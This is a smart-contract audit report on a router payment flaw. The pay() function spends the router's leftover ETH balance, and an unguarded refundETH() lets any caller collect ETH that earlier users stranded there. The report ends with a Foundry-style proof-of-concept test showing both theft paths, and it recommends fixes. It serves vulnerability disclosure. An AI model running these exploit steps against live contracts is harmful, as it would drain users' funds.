Audit Report

## Title
Router `pay()` consumes stranded native ETH balance to settle WETH-input swaps, enabling theft of prior users' ETH — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

The `pay` function reads `address(this).balance` — the router's total ETH balance — when settling WETH-leg payments, rather than scoping to the current transaction's `msg.value`. Any ETH left on the router from a prior user's excess payment is silently consumed to fund a subsequent caller's WETH swap. The public `refundETH()` helper compounds this by sending the router's entire ETH balance to any caller with no ownership attribution.

## Finding Description

In `PeripheryPayments.sol` lines 73–84, the WETH branch of `pay()` reads `address(this).balance`:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // total router ETH, not msg.value
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

When `nativeBalance >= value`, the router deposits its own ETH as WETH and forwards it to the pool without pulling a single token from `payer`. The transient payer identity stored in `TransientCallbackPool` (`T_PAYER_SLOT`) is irrelevant when the router's ETH balance is sufficient — `safeTransferFrom` is never called.

ETH accumulates on the router whenever a user calls a payable entry point (`exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`) with `msg.value` exceeding the actual swap cost and omits a `refundETH()` call in the same multicall. The `receive()` guard at lines 32–34 only blocks direct ETH pushes from non-WETH addresses; it does not prevent excess `msg.value` from sitting on the router after a swap completes. The transient storage layout in `TransientCallbackPool` tracks pool, callback mode, payer, and token-to-pay — but never `msg.value`, so there is no per-transaction ETH accounting.

`refundETH()` at lines 58–63 sends the router's entire ETH balance to `msg.sender` with no ownership check:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

## Impact Explanation

Two concrete, unrecoverable loss paths exist:

**Path A — free WETH swap:** Attacker calls `exactInputSingle{value: 0}(tokenIn=WETH, amountIn=S)` where `S` equals the stranded ETH. `pay()` sees `address(this).balance == S >= S`, deposits the stranded ETH as WETH, and forwards it to the pool. Attacker receives the token-out leg without spending any ETH or WETH. The victim's stranded ETH is permanently consumed.

**Path B — direct ETH theft:** Attacker calls `refundETH()` in a standalone transaction. The entire stranded ETH balance is transferred to the attacker.

Both paths result in direct, unrecoverable loss of the victim's principal ETH. This meets the Critical/High threshold for direct loss of user principal with no external conditions required beyond a monitoring bot watching the router's ETH balance.

## Likelihood Explanation

ETH is stranded whenever a user calls a payable router function with `msg.value > amountIn` and does not include `refundETH()` in the same multicall. This is a realistic user error: direct (non-multicall) calls to `exactInputSingle` with a safety buffer of ETH leave residue. The attack requires no special privilege, no oracle manipulation, and no pool state precondition — only observation of the router's ETH balance. Both attack paths are repeatable and permissionless.

## Recommendation

1. **Track `msg.value` per entry point in transient storage.** At the start of each payable public function, record `msg.value` in a dedicated transient slot. In `pay()`, use `min(transientMsgValue, value)` as the native contribution rather than `address(this).balance`.
2. **Alternatively, auto-refund excess ETH at the end of every non-multicall payable entry point**, so no ETH can survive past the transaction boundary.
3. **Add a caller-binding check to `refundETH()`.** Record the original `msg.sender` in transient storage at multicall entry and restrict `refundETH()` to that address, or document clearly that it is intentionally open and that users must always pair it in the same multicall.

## Proof of Concept

```solidity
// Step 1 — victim overpays and omits refundETH()
vm.deal(victim, 2 ether);
vm.prank(victim);
router.exactInputSingle{value: 2 ether}(ExactInputSingleParams({
    pool:             address(pool),
    tokenIn:          address(weth),
    tokenOut:         address(token1),
    zeroForOne:       true,
    amountIn:         1 ether,
    amountOutMinimum: 0,
    recipient:        victim,
    deadline:         block.timestamp + 1,
    priceLimitX64:    0,
    extensionData:    ""
}));
// 1 ether is now stranded on the router

// Path A — attacker steals via free swap
vm.prank(attacker);
router.exactInputSingle{value: 0}(ExactInputSingleParams({
    pool:             address(pool),
    tokenIn:          address(weth),
    tokenOut:         address(token1),
    zeroForOne:       true,
    amountIn:         1 ether,   // pay() uses router's stranded 1 ether
    amountOutMinimum: 0,
    recipient:        attacker,
    deadline:         block.timestamp + 1,
    priceLimitX64:    0,
    extensionData:    ""
}));
assert(token1.balanceOf(attacker) > 0);
assert(address(router).balance == 0);

// OR Path B — direct ETH theft
vm.prank(attacker);
router.refundETH();
assert(attacker.balance == 1 ether);
```